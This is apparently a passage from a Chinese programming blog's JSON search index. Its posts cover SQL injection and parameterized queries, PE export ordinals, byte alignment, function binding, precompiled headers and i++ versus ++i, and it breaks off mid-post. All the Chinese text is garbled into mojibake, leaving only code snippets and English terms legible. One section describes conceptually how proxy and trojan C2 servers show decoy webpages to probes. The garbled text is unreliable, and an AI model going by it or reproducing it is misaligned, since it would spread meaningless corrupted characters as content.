æ­å»ºè¿‡SQLæ³¨å…¥é¶åœºç¯å¢ƒå°±ä¼šçŸ¥é“ï¼Œå¦‚æœæœåŠ¡å™¨ç«¯çš„è„šæœ¬è¯­è¨€ï¼Œæ¯”å¦‚PHPä»£ç æ²¡æœ‰å¯¹ç”¨æˆ·é€šè¿‡URLæäº¤çš„å‚æ•°ä½œé€‚å½“æ ¡éªŒï¼Œè¿™ä¹ˆå‚æ•°ä¸­çš„æ•°æ®å°±æœ‰å¯èƒ½è¢«é”™è¯¯åœ°å½“ä½œä»£ç æ‰§è¡Œï¼ˆâ€œæ•°æ®è¢«å½“æˆä»£ç æ‰§è¡Œâ€ï¼‰ï¼Œä»è€Œå¯¼è‡´â€œSQLæ³¨å…¥â€ã€‚ ä¸æ­¤ç±»ä¼¼çš„æ˜¯ï¼Œåœ¨è¿›ç¨‹ç©ºé—´ä¸­çš„æ•°æ®åŒºæ‰§è¡Œä»£ç ï¼ˆæ•°æ®å’Œä»£ç æœ¬è´¨éƒ½æ˜¯ä¸€å †æ•°ï¼‰ã€‚è§£å†³æ•°æ®åŒºæ‰§è¡Œä»£ç çš„æªæ–½ä¹‹ä¸€ï¼Œå°±æ˜¯è®©è®©æ•°æ®åŒºæ²¡æœ‰å¯æ‰§è¡Œæƒé™ã€‚ç±»ä¼¼åˆ°é˜²æ­¢SQLæ³¨å…¥ä¸Šï¼Œå°±æ˜¯ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ã€‚å‚æ•°åŒ–æŸ¥è¯¢è®©ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä»…ä½œä¸ºæ•°æ®è¿›è¡Œå¤„ç†ï¼Œè€Œä¸ä¼šè¢«è§£é‡Šæˆ–æ‰§è¡Œä¸ºä»£ç ã€‚ switchè¯­å¥åœ°å€è¡¨ å’Œ PEæ–‡ä»¶å¯¼å‡ºåºå·è°ƒæ•´ å½“ç¼–è¯‘å™¨å¤„ç†Switchè¯­å¥å†³å®šé‡‡ç”¨åœ°å€è¡¨ä¼˜åŒ–æ—¶ï¼Œé‚£ä¹ˆä¸ç®¡caseåˆ¤å®šå€¼çš„å¤§å°æ˜¯å¤šå°‘ï¼Œç¼–è¯‘å™¨éƒ½ä¼šè¿›è¡Œä¸‹æ ‡è°ƒæ•´ï¼Œä»¥ä¾¿å¯ä»¥ä»æ•°ç»„çš„ç¬¬ä¸€ä¸ªä¸‹æ ‡ï¼ˆå³0ï¼‰å¼€å§‹è®¿é—®ã€‚æ¯”å¦‚case101-case104ï¼Œç¼–è¯‘å™¨ä¼šå…ˆå°†caseå€¼å‡å»101ï¼Œç”¨è°ƒæ•´åçš„ä¸‹æ ‡å†å»åœ°å€è¡¨æŸ¥è¡¨ã€‚ ç±»ä¼¼åœ°ï¼Œåœ¨ä½¿ç”¨Windows APIçš„GetProcAddresså‡½æ•°é€šè¿‡åºå·æŸ¥è¯¢å¯¼å‡ºå‡½æ•°çš„åœ°å€ï¼Œè°ƒç”¨è¿‡ç¨‹ä¹Ÿæ¶‰åŠä¸‹æ ‡çš„è°ƒæ•´ã€‚å…·ä½“æƒ…å†µæ˜¯ï¼Œä¼ å…¥çš„åºå·ä¼šé¦–å…ˆå‡å»ä¸€ä¸ªåŸºæ•°ï¼ˆBaseï¼‰ï¼Œç”¨å¾—åˆ°çš„ç»“æœä½œä¸ºæ–°çš„ä¸‹æ ‡å»å‡½æ•°åœ°å€è¡¨ä¸­æŸ¥è¡¨ï¼Œå¾—åˆ°å¯¼å‡ºå‡½æ•°åœ°å€ã€‚ ä¸Šè¿°ä¸¤ç§æƒ…å†µéƒ½è¿›è¡Œäº†ä¸‹æ ‡è°ƒæ•´ï¼ŒåŸå› æ˜¯ä¸€æ ·çš„ï¼šæ— è®ºæ˜¯switchçš„åœ°å€è¡¨è¿˜æ˜¯PEæ–‡ä»¶çš„å‡½æ•°åœ°å€è¡¨ï¼Œæ•°ç»„çš„èµ·å§‹åºå·éƒ½æ˜¯ä»0å¼€å§‹ã€‚å› æ­¤ï¼Œè¿›è¡Œé€‚å½“çš„ä¸‹æ ‡è°ƒæ•´æ˜¯å¿…è¦çš„ï¼Œä»¥ç¡®ä¿æ— è®ºè¾“å…¥åºå·å¦‚ä½•ï¼Œæ•°ç»„è®¿é—®éƒ½èƒ½æ­£ç¡®åœ°ä»0å¼€å§‹ã€‚ ä¼ªè£…ä¸åˆ†æµæŠ€æœ¯ï¼ˆfallbackæŠ€æœ¯ï¼‰ æœåŠ¡å™¨çš„è¡Œä¸ºä¼šæ ¹æ®æ¥æ”¶çš„æ•°æ®åŒ…ç±»å‹è¿›è¡Œè°ƒæ•´ï¼Œæ¯”å¦‚åˆ†æµæ“ä½œã€‚è¿™åœ¨X-raysä¸­ç§°ä¸ºfallbackæŠ€æœ¯ã€‚ Trojan-serverèŠ‚ç‚¹çš„åˆ†æµç­–ç•¥ TrojanæœåŠ¡ç«¯èŠ‚ç‚¹æ ¹æ®æ¥æ”¶çš„æ•°æ®åŒ…åšåˆ†æµï¼š å¦‚æœæ˜¯æœ‰æ•ˆçš„trojanæ•°æ®åŒ…ï¼Œè¿›è¡Œä»£ç†åŠŸèƒ½ å¦‚æœä¸æ˜¯æœ‰æ•ˆçš„trojanæ•°æ®åŒ…ï¼ŒæœåŠ¡å™¨å°†æ–­å¼€è¿æ¥æˆ–é‡å®šå‘åˆ°ä¸€ä¸ªä¼ªè£…çš„ç½‘é¡µï¼ˆé˜²æ­¢GFWä¸»åŠ¨æ¢æµ‹ã€‚å¦‚æœGFWä¸»åŠ¨è¿æ¥ï¼Œå°†çœ‹åˆ°çš„æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç½‘é¡µï¼‰ Vmess + Nginx åœ¨VmessæœåŠ¡ç«¯èŠ‚ç‚¹å‰ç½®ä¸€ä¸ªNginxæœåŠ¡å™¨æ¥å®ç°ç±»ä¼¼çš„åˆ†æµå’Œä¼ªé€ åŠŸèƒ½ã€‚Nginxä½œä¸ºåå‘ä»£ç†ï¼Œæ ¹æ®å…¥ç«™çš„æ•°æ®æµé€‰æ‹©è½¬å‘è‡³vmessæœåŠ¡æˆ–ä¼ªé€ ã€‚ C2æœåŠ¡å™¨ åœ¨æœ¨é©¬ä¸å…¶C2ï¼ˆå‘½ä»¤ä¸æ§åˆ¶ï¼‰æœåŠ¡å™¨é€šä¿¡çš„åœºæ™¯ï¼ŒæœåŠ¡å™¨åŒæ ·å¯ä»¥é‡‡ç”¨è¿™ç§åˆ†æµæŠ€æœ¯ã€‚ å¦‚æœæ˜¯æœ¨é©¬ç«¯å›è¿C2æœåŠ¡å™¨ï¼Œåˆ™è¿›è¡Œåç»­çš„æŒ‡ä»¤å’Œæ•°æ®äº¤æ¢ å¦‚æœä¸æ˜¯ï¼ŒæœåŠ¡ç«¯è¿”å›ä¸€ä¸ªæ™®é€šç½‘é¡µæˆ–å…¶ä»–éæ¶æ„å†…å®¹ï¼Œæ¥è¯¯å¯¼æ¢æµ‹è€… å­—èŠ‚å¯¹é½ å› ä¸ºç¡¬ä»¶è®¾è®¡çš„åŸå› ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœæ•°æ®çš„èµ·å§‹åœ°å€æ˜¯ç¡¬ä»¶è¯»å†™æ“ä½œåŸºæœ¬å•ä½çš„æ•´å€æ•°ï¼Œé‚£ä¹ˆç¡¬ä»¶åœ¨è¯»å†™è¿™äº›æ•°æ®æ—¶æ•ˆç‡æ›´é«˜ï¼Œå°±ä¸éœ€è¦äºŒæ¬¡è¯»å†™åˆ†æ•£æ•°æ®ã€‚ å­—èŠ‚å¯¹é½æœ¬è´¨ä¸Šå°±æ˜¯æ•°æ®çš„èµ·å§‹åœ°å€æ˜¯æŸä¸ªæ•°çš„æ•´æ•°å€ï¼Œè¿™ä¸ªæ¦‚å¿µå¯ä»¥ç”¨åˆ«çš„è¯´æ³•æ¥è¡¨è¾¾ï¼š æ•°æ®çš„èµ·å§‹åœ°å€èƒ½æ•´é™¤å¯¹é½å€¼ è¿™ä¸ªæ•°æ®å—çš„æ€»å¤§å°èƒ½æ•´é™¤å¯¹é½å€¼ å­—èŠ‚å¯¹é½åœ¨è®¡ç®—æœºä¸­å¹¿æ³›å¯è§å…¶èº«å½±ï¼š ç»“æ„ä½“å¯¹é½è§„åˆ™ï¼šä»¥ä¾¿å‡å°‘å†…å­˜è®¿é—®æ¬¡æ•°ã€‚ ç¡¬ç›˜æ•°æ®æ‰‡åŒºå¯¹é½ï¼šæœºæ¢°ç¡¬ç›˜è¯»å†™æ•°æ®çš„æœ€å°å•å…ƒï¼Œæ‰‡åŒºï¼Œæ˜¯512å­—èŠ‚ï¼ˆ0x200ï¼‰ï¼Œæ‰€ä»¥åœ¨æ—©æœŸæ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¸­PEæ–‡ä»¶çš„æ–‡ä»¶å¯¹é½å€¼ä¸º200hã€‚ç°åœ¨éšç€å­˜å‚¨å®¹é‡ä¸Šå‡ä»·æ ¼ä¸‹é™ï¼Œæ–‡ä»¶å¯¹é½å€¼å¯ä»¥æ˜¯1000hï¼Œä»¥ç©ºé—´æ¢æ—¶é—´ï¼Œå…å»åŠ è½½æ—¶å€™çš„æ‹‰ä¼¸è¿‡ç¨‹ã€‚ PEæ–‡ä»¶çš„å†…å­˜å¯¹é½ï¼šå†…å­˜é¡µä»¥4kbä¸ºæœ€å°å•ä½ï¼Œæ‰€ä»¥PEæ–‡ä»¶çš„SectionAlignmenté€šå¸¸è®¾ä¸º1000hã€‚ è¿›ç¨‹ç©ºé—´ä¸­æ¨¡å—ä¸æ¨¡å—ä¹‹é—´çš„å¯¹é½ï¼šå„æ¨¡å—èµ·å§‹åœ°å€æ˜¯64kçš„æ•´æ•°å€ï¼Œå³10000hã€‚ä½†ç¬”è€…ä¸æ¸…æ¥šä¸ºä»€ä¹ˆæ¨¡å—ä¸æ¨¡å—ä¹‹é—´çš„å¯¹é½å€¼æ˜¯64kï¼Œå¯èƒ½å°±æ˜¯è®¾äº†ä¸€ä¸ªè¾ƒå¤§å°ºå¯¸ã€‚ ç»‘å®šæœºåˆ¶ï¼ˆbindingï¼‰ ç»‘å®šï¼šå‡½æ•°è°ƒç”¨å¤„ä¸å‡½æ•°åœ°å€å…³è”èµ·æ¥çš„è¿‡ç¨‹ åœ¨C++ç¼–ç¨‹ä¸­ï¼š éè™šå‡½æ•°ï¼Œæ—©ç»‘å®šï¼Œå‡½æ•°åœ°å€åœ¨ç¨‹åºç¼–è¯‘æ—¶å°±ç¡®å®šäº† è™šå‡½æ•°ï¼Œæ™šç»‘å®šï¼Œå‡½æ•°åœ°å€åœ¨å‡½æ•°è°ƒç”¨æ—¶æ‰èƒ½ç¡®å®š æ—©ç»‘å®šï¼Œåœ°å€ç¡®å®šçš„ï¼Œå‡½æ•°è°ƒç”¨æ•ˆç‡é«˜ï¼›æ™šç»‘å®šï¼Œé—´æ¥è°ƒç”¨ï¼Œæœ‰çµæ´»æ€§ï¼Œä½†ç›¸å¯¹è€Œè¨€å¢åŠ äº†è°ƒç”¨å¼€é”€ã€‚ åœ¨PEæ–‡ä»¶çš„å¯¼å…¥è¡¨è¿™å—ï¼š æå‰ç»‘å®šï¼šåœ¨PEæ–‡ä»¶åŠ è½½å‰ï¼Œæå‰æŠŠè¦å¤–éƒ¨å‡½æ•°åœ°å€å›ºåŒ–åˆ°IATè¡¨è¡¨é¡¹ä¸­ è¿è¡Œæ—¶ç»‘å®šï¼šPEæ–‡ä»¶åŠ è½½æ—¶ï¼Œç”±åŠ è½½å™¨é€ä¸€å°†IATè¡¨ä¸­çš„æ¡ç›®æ›¿æ¢ä¸ºå®é™…çš„å‡½æ•°åœ°å€ æå‰ç»‘å®šï¼Œå¦‚æœé‡åˆ°dllæœªèƒ½æŒ‰é¢„æœŸæƒ³æ³•é‚£æ ·åŠ è½½ï¼Œè¿˜æ˜¯éœ€è¦é‡æ–°æ›¿æ¢IATè¡¨ã€‚è¿™ä¹Ÿç±»ä¼¼äºæŒ‡ä»¤æµæ°´çº¿ä¼šæå‰é¢„æµ‹ï¼Œé¢„æµ‹å¯¹äº†ï¼Œæ‰§è¡Œæ•ˆç‡é«˜ï¼Œé¢„æµ‹å¤±è´¥å°±å›é€€ã€‚","tags":["çŸ¥è¯†å…±é€šæ€§"],"categories":["è®¡ç®—æœºçŸ¥è¯†","æ‚è°ˆ"]},{"title":"C/C++ é¢„ç¼–è¯‘å¤´","path":"/posts/82675b27.html","content":"é¢„ç¼–è¯‘å¤´è§£å†³äº†ä»€ä¹ˆé—®é¢˜ éœ€è¦å…ˆç®€å•åœ°ä»‹ç»ä¸‹ä¸€ä¸ªé¡¹ç›®ç¼–è¯‘æˆexeçš„è¿‡ç¨‹ã€‚ é¢„å¤„ç†(Preprocessing)ï¼šä¸»è¦ç”¨äºå¤„ç†#å¼€å¤´çš„ä»£ç è¡Œï¼Œå¤´æ–‡ä»¶å±•å¼€ï¼Œæ¡ä»¶ç¼–è¯‘å±•å¼€ï¼Œåˆ é™¤æ³¨é‡Šã€‚ç”Ÿæˆä»¥.iå’Œ.iiç»“å°¾çš„ç»“æœæ–‡ä»¶ã€‚ ç¼–è¯‘(Compilation)ï¼šä½¿ç”¨é¢„å¤„ç†çš„è¾“å‡ºç»“æœä½œä¸ºè¾“å…¥ï¼Œç”Ÿæˆæ–‡æœ¬æ ¼å¼çš„å¹³å°ç›¸å…³çš„æ±‡ç¼–ä»£ç (assembly code)ã€‚æ–‡ä»¶ä»¥.sç»“å°¾ã€‚ æ±‡ç¼–(Assemble)ï¼šå°†ä¸Šä¸€æ­¥çš„æ±‡ç¼–ä»£ç è½¬æ¢æˆäºŒè¿›åˆ¶çš„æœºå™¨ç ï¼Œç§°ä¸ºobject codeã€‚äº§ç”Ÿçš„æ–‡ä»¶å«åšç›®æ ‡æ–‡ä»¶ï¼Œæ˜¯äºŒè¿›åˆ¶æ ¼å¼ï¼Œæ–‡ä»¶ä»¥.oæˆ–.objç»“å°¾ã€‚ é“¾æ¥(Linking)ï¼šé“¾æ¥è¿‡ç¨‹å°†å¤šä¸ªç›®æ ‡æ–‡ä»¥åŠæ‰€éœ€çš„åº“æ–‡ä»¶(.soç­‰)é“¾æ¥æˆæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶(executable file)ã€‚ å¹³æ—¶å¼€å‘æ—¶.hæ–‡ä»¶çš„åç¼€æ˜¯çº¦å®šä¿—æˆçš„ï¼Œåç¼€åå…¶å®æ— æ‰€è°“ï¼Œæ”¹æˆå…¶ä»–çš„æœå¯ä»¥ã€‚åœ¨cppæ–‡ä»¶ä¸­#include .hæ–‡ä»¶çš„ä½œç”¨å°±æ˜¯å°†è¿™ä¸ªå¤´æ–‡ä»¶é‡Œçš„å†…å®¹â€œç²˜è´´â€ä¸€ä»½åˆ°cppæ–‡ä»¶ä¸­çš„è¿™è¡Œ#includeè¯­å¥ï¼Œå¤´æ–‡ä»¶å±•å¼€æ˜¯åœ¨é¢„å¤„ç†è¿‡ç¨‹åšçš„ã€‚ç„¶ååˆ°äº†ç¬¬äºŒæ­¥ç¼–è¯‘(Compilation)ï¼ŒC/C++ ç¼–è¯‘å™¨åªç¼–è¯‘æºæ–‡ä»¶ï¼ˆ.c/.cc/.cxx/.cppï¼‰ï¼ŒC/C++ æ˜¯ä»¥æ–‡ä»¶ä¸ºç¼–è¯‘å•ä½ï¼ˆC++ 20ä¸­æ‰æœ‰å…¶ä»–é«˜çº§è¯­è¨€ç¼–è¯‘å•å…ƒæ˜¯æ•´ä¸ªModuleä¸‹æ‰€æœ‰æºç çš„æ¦‚å¿µï¼‰ï¼Œæ¯ä¸ªæºæ–‡ä»¶ï¼ˆ.c/.cc/.cxx/.cppï¼‰éƒ½å•ç‹¬ç¼–è¯‘æˆä¸ºä¸€ä¸ª.o/.objæ–‡ä»¶ï¼Œæœ€åç”±é“¾æ¥å™¨é“¾objectæ–‡ä»¶æˆä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚ ç”±ç¼–è¯‘åŸç†å’ŒC/C++ ä»¥æ¯ä¸ªæºæ–‡ä»¶ç‹¬ç«‹ç¼–è¯‘çš„ç‰¹ç‚¹å¯ä»¥å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œå‡è®¾æœ‰A.hå’ŒA.cppï¼ŒB.hå’ŒB.cppå’ŒC.hå’ŒC.cppã€‚å‡å¦‚A.cppï¼ŒB.cppï¼ŒC.cppéƒ½ç”¨åˆ°äº†åŒä¸€äº›å¤´æ–‡ä»¶ï¼Œæ¯”å¦‚éƒ½ç”¨åˆ°äº†stdio.hï¼Œéƒ½ç”¨åˆ°äº†Windows.hã€‚é‚£ä¹ˆstdio.hå’ŒWindows.hé‡Œçš„å†…å®¹åœ¨ç¼–è¯‘æ—¶éƒ½è¦åœ¨ç¼–è¯‘å•å…ƒAï¼ŒBï¼ŒCéƒ½è¦è¿›è¡Œâ€œæ–‡ä»¶å±•å¼€â€ï¼ˆéƒ½è§£æï¼Œå¤åˆ¶æ‹·è´ä¸€æ¬¡ï¼‰ã€‚ å¦‚æœåœ¨ä¸€ä¸ªéå¸¸å¤§çš„é¡¹ç›®ä¸­ï¼Œä¸€ä¸ªå¤´æ–‡ä»¶è¢«Nä¸ªæºæ–‡ä»¶åŒæ—¶å¼•ç”¨ï¼Œè¿™æ ·çš„å¼€é”€ä¼šå¾ˆå¤§ã€‚ é¢„ç¼–è¯‘å¤´æ–‡ä»¶ é¢„ç¼–è¯‘å¤´æ–‡ä»¶ï¼ˆPrecompiled Headerï¼ŒPCHï¼‰ï¼Œç®€ç§°é¢„ç¼–è¯‘å¤´ã€‚å°±æ˜¯å°†é‚£äº›å¸¸ç”¨çš„å¤´æ–‡ä»¶ï¼ˆæ¯”å¦‚å†™windowsç¨‹åºï¼Œå‡ ä¹éƒ½è¦åŒ…å«Windows.hå¤´æ–‡ä»¶ï¼‰æ”¾åœ¨é¢„ç¼–è¯‘å¤´ä¸­ï¼Œè®©ç¼–è¯‘å™¨æŒ‡å®šè¿™ä¸ªé¢„ç¼–è¯‘å¤´ã€‚å½“ç¬¬ä¸€æ¬¡ç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨ä¼šå°†è¿™ä¸ªé¢„ç¼–è¯‘å¤´ç¼–è¯‘ç”Ÿæˆä¸€ä¸ª.pchåç¼€çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼›ä¹‹åï¼Œå¦‚æœé¢„ç¼–è¯‘å¤´é‡Œçš„å†…å®¹æ²¡æœ‰è¿›è¡Œä¿®æ”¹ï¼Œåˆ™ç›´æ¥ä½¿ç”¨é¢„å…ˆç”Ÿæˆçš„è¿™ä¸ª.pchäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°†è¿™ä¸ªæ–‡ä»¶è½½å…¥å†…å­˜ï¼ˆæ‰€ä»¥ä½¿ç”¨é¢„ç¼–è¯‘å¤´ä¼šæé«˜é¡¹ç›®çš„å†…å­˜å ç”¨ï¼‰ï¼Œä»è€ŒåŠ å¿«ç¼–è¯‘é€Ÿåº¦ã€‚ å¦‚æœé¢„ç¼–è¯‘å¤´çš„å†…å®¹è¿›è¡Œäº†ä¿®æ”¹ï¼Œéœ€è¦é‡æ–°ç¼–è¯‘ç”Ÿæˆ.pchäºŒè¿›åˆ¶æ–‡ä»¶ã€‚å› æ­¤ï¼Œåœ¨é¢„ç¼–è¯‘å¤´ä¸­åº”è¯¥æ”¾ä¸€äº›ä¸å¸¸æ”¹åŠ¨çš„å†…å®¹ï¼Œå¦‚ æ ‡å‡†åº“STLå¤´æ–‡ä»¶ ç¬¬ä¸‰æ–¹åº“å¤´æ–‡ä»¶ å®å®šä¹‰ é¢„å®šä¹‰çš„ç±»å‹ ä¸€äº›æˆ‘ä»¬è‡ªå·±å†™çš„ä½†åŸºæœ¬ä¸ä¼šæ›´æ”¹çš„å¤´æ–‡ä»¶ç­‰ç­‰ã€‚ ä½¿ç”¨é¢„ç¼–è¯‘å¤´ ç¼–è¯‘å™¨å¼€å¯ä½¿ç”¨é¢„ç¼–è¯‘å¤´ åœ¨é¡¹ç›®-C/C++-é¢„ç¼–è¯‘å¤´ï¼Œå¯ç”¨æˆ–å…³é—­ä½¿ç”¨é¢„ç¼–è¯‘å¤´ å¯ç”¨é¢„ç¼–è¯‘å¤´çš„è¯ï¼Œåˆ›å»ºï¼ˆ/Ycï¼‰å’Œä½¿ç”¨ï¼ˆ/Yuï¼‰éƒ½è¦åˆ†åˆ«è®¾ç½®ä¸€æ¬¡ï¼Œéƒ½å¡«ä¸Šè‡ªå·±çš„é¢„ç¼–è¯‘å¤´æ–‡ä»¶åã€‚ æ–‡ä»¶åå­—å¯ä»¥ä»»æ„ å¯ä»¥çœ‹åˆ°è¾“å‡ºæ–‡ä»¶æ˜¯$(IntDir)$(TargetName).pchï¼Œå°±æ˜¯ç¼–è¯‘åä¼šç”Ÿæˆåç¼€åä¸º.pchçš„äºŒè¿›åˆ¶æ–‡ä»¶ ç¼–å†™é¢„ç¼–è¯‘å¤´ pch.h123#pragma once#include &lt;Windows.h&gt; å› ä¸ºC/C++ æ˜¯å¯¹ï¼ˆ.c/.cc/.cxx/.cppï¼‰è¿›è¡Œç¼–è¯‘ï¼Œä¸å¯¹å¤´æ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªå¯¹åº”çš„.cppæ–‡ä»¶ï¼Œè¿™ä¸ª.cppæ–‡ä»¶æ˜¯ä¸ºäº†ç¼–è¯‘ï¼Œæ‰€ä»¥è¿™ä¸ª.cppé‡Œçš„å†…å®¹åªè¦æœ‰åŒ…å«è¿™ä¸ªå¤´æ–‡ä»¶çš„è¯­å¥å³å¯ pch.cpp1#include &quot;pch.h&quot; æ³¨æ„ï¼šåœ¨é¢„ç¼–è¯‘å¤´æ–‡ä»¶ä¹‹åå†é‡å¤åŒ…å«è¯¥æ–‡ä»¶å†…å·²åŒ…å«çš„å¤´æ–‡ä»¶å¹¶ä¸ä¼šæœ‰é—®é¢˜ï¼Œæ‰€ä»¥ä¸å¿…ç‰¹æ„å»æ‰é‚£äº›é‡å¤çš„åŒ…å«è¯­å¥ã€‚ åŒ…å«é¢„ç¼–è¯‘å¤´ éœ€è¦åœ¨æ‰€æœ‰çš„æºæ–‡ä»¶ä¸­åŒ…å«é¢„ç¼–è¯‘å¤´æ–‡ä»¶ï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶å¿…é¡»æ˜¯ç¬¬ä¸€ä¸ªåŒ…å«çš„ï¼Œå¦åˆ™ä¼šç¼–è¯‘å¤±è´¥ã€‚ åŸå› ï¼šç”±äºç¼–è¯‘å™¨å‡å®šé¢„ç¼–è¯‘å¤´ä¸­åŒ…å«è¿‡çš„å¤´æ–‡ä»¶ä¼šåœ¨æ‰€æœ‰cppä¸­ä½¿ç”¨ï¼Œå› æ­¤å®ƒåœ¨ç¼–è¯‘ä½ çš„ cpp çš„æ—¶å€™ï¼Œå°±ä¼šå°†é¢„ç¼–è¯‘å¤´ä¸­å·²ç»ç¼–è¯‘å®Œçš„éƒ¨åˆ†åŠ è½½åˆ°å†…å­˜ä¸­ã€‚å¦‚æœå®ƒçªç„¶å‘ç°ä½ çš„ cpp å±…ç„¶æ²¡æœ‰åŒ…å«é¢„ç¼–è¯‘å¤´ï¼Œå®ƒå°±ä¼šå¾ˆéƒé—·ï¼Œå› ä¸ºå®ƒä¸çŸ¥é“è¯¥å¦‚ä½•å°†å·²ç¼–è¯‘å®Œçš„éƒ¨åˆ†ä»å†…å­˜ä¸­è¯·å‡ºå»ï¼Œæ•´ä¸ªç¼–è¯‘è¿‡ç¨‹å°±ä¼šå¤±è´¥ã€‚å› æ­¤ï¼Œå¦‚æœä½ ä½¿ç”¨äº†é¢„ç¼–è¯‘å¤´æŠ€æœ¯ï¼Œå°±å¿…é¡»åœ¨æ‰€æœ‰çš„ cpp ä¸­åŒ…å«é¢„ç¼–è¯‘å¤´ã€‚ å¦‚æœè§‰å¾—æ¯æ¬¡åœ¨cppæ–‡ä»¶ä¸­æ‰‹åŠ¨æ·»åŠ è¿™å¥å¤ªéº»çƒ¦ï¼ŒVSæä¾›äº†å¼ºåˆ¶åœ¨æ‰€æœ‰æºæ–‡ä»¶ä¸­åŒ…å«æŒ‡å®šå¤´æ–‡ä»¶çš„é€‰é¡¹ã€‚åœ¨é¡¹ç›®å±æ€§-C/C++-é«˜çº§ï¼Œå¼ºåˆ¶åŒ…å«æ–‡ä»¶é€‰é¡¹ä¸­åŠ ä¸Šè¿™ä¸ªé¢„ç¼–è¯‘å¤´ã€‚ ä¾‹ æœªå¼€å¼ºåˆ¶åŒ…å«æ–‡ä»¶ pch.h123#pragma once#include &lt;Windows.h&gt; pch.cpp1#include &quot;pch.h&quot; main.cpp123456#include &quot;pch.h&quot;int main()&#123;\treturn 0;&#125; å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„.pchæ–‡ä»¶ Tipsï¼š ä½¿ç”¨VCåˆ›å»ºä¸€ä¸ªâ€œæ§åˆ¶å°çš„Hello World!â€é¡¹ç›®ï¼Œæœ¬æ–‡ä¸­è¯´çš„é¢„ç¼–è¯‘å¤´æŒ‡çš„å°±æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„StdAfx.hå’ŒStdAfx.cppã€‚ ä½¿ç”¨VS2019åˆ›å»ºä¸€ä¸ªé™æ€é“¾æ¥åº“æˆ–åŠ¨æ€é“¾æ¥åº“é¡¹ç›®ï¼Œæœ¬æ–‡ä¸­è¯´çš„é¢„ç¼–è¯‘å¤´æŒ‡çš„å°±æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„pch.hå’Œpch.cppã€‚ å‚è€ƒé“¾æ¥ å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ å¦‚ä½•ä½¿ç”¨é¢„ç¼–è¯‘å¤´ä»¥åŠé¢„ç¼–è¯‘å¤´çš„åŸç†.rst ç”¨g++ç”Ÿæˆpchæ–‡ä»¶ï¼Œå³ä½¿åˆ é™¤é¢„ç¼–è¯‘å¤´æ–‡ä»¶ï¼Œä½¿ç”¨pchæ–‡ä»¶ï¼Œç¼–è¯‘ä¹Ÿèƒ½é€šè¿‡ C++é¢„ç¼–è¯‘å¤´æ–‡ä»¶ å‚è€ƒäº†è¿™ç¯‡æ–‡ç« ç¼–è¯‘çš„è¿‡ç¨‹ ä½¿ç”¨é¢„ç¼–è¯‘å¤´æé«˜ç¼–è¯‘é€Ÿåº¦ å†™å¾—æŒºå¥½çš„ï¼Œå¯ä»¥çœ‹ä¸‹æ“ä½œ ã€C++è¿›é˜¶ä¹‹è·¯ç¬¬ä¸€å·ã€‘é¢„ç¼–è¯‘å¤´åŠ å¿«ç¼–è¯‘é€Ÿåº¦ å†™å¾—æŒºå¥½çš„ï¼Œå¯ä»¥çœ‹ä¸‹æ“ä½œ visual studioé¢„ç¼–è¯‘å¤´ å¾ˆç®€çŸ­çš„æ–‡å­— VS2019è‡ªå®šä¹‰é¢„ç¼–è¯‘å¤´æ–‡ä»¶ å†™å¾—å¯ä»¥ å…³äºé¢„ç¼–è¯‘å¤´æ–‡ä»¶çš„ä¸€äº›çŸ¥è¯† ä¸ºä»€ä¹ˆæºæ–‡ä»¶éœ€è¦åŒ…å«é¢„ç¼–è¯‘å¤´æ–‡ä»¶","tags":["C/C++","é¢„ç¼–è¯‘å¤´"],"categories":["ç¼–ç¨‹è¯­è¨€","C/C++"]},{"title":"i++å’Œ++iæ‰§è¡Œæ•ˆç‡åˆ†æ","path":"/posts/177574ba.html","content":"å‰è¨€ åœ¨C/C++ç¼–ç¨‹ä¸­ï¼Œå¸¸ç”¨å‰ç¼€++å’Œåç¼€++è¿ç®—ç¬¦ï¼Œé™¤äº†å…ˆç”¨ååŠ ï¼Œå…ˆåŠ åç”¨ï¼Œä½ æœ‰æƒ³è¿‡å®ƒä»¬çš„åŒºåˆ«å—ï¼Œå®ƒä»¬å†…éƒ¨å¦‚ä½•å®ç°ï¼Œå®ƒä»¬çš„è¿è¡Œæ•ˆç‡ï¼Ÿ 12i++; //å…ˆç”¨ååŠ ++i; //å…ˆåŠ åç”¨ ç†è®ºåˆ†æ å‰ç¼€++ (++i) é€’å¢içš„å€¼ returné€’å¢åçš„å€¼ å‰ç¼€++ è¿ç®—ç¬¦çš„ç›®çš„æ˜¯å¢åŠ å¯¹è±¡çš„å€¼ï¼Œå¹¶ç«‹å³ä½¿ç”¨æ›´æ–°åçš„å€¼ï¼Œè¿™ä¸€è¿‡ç¨‹ä¸éœ€è¦å­˜å‚¨içš„åŸå§‹å€¼ï¼Œä¹Ÿä¸éœ€è¦é¢å¤–çš„ä¸´æ—¶å˜é‡ 1234//å‰ç¼€ç‰ˆæœ¬int i = 5;int r = ++i; //1ã€içš„å€¼å¢åŠ ï¼Œå˜ä¸º6 //2ã€6çš„å€¼ä¼ ç»™r åç¼€++ (i++) é¦–å…ˆç”¨ä¸€ä¸ªä¸´æ—¶å˜é‡å­˜ä¸€ä¸‹içš„åŸå§‹å€¼ï¼Œä½œä¸ºå‰¯æœ¬ é€’å¢içš„å€¼ 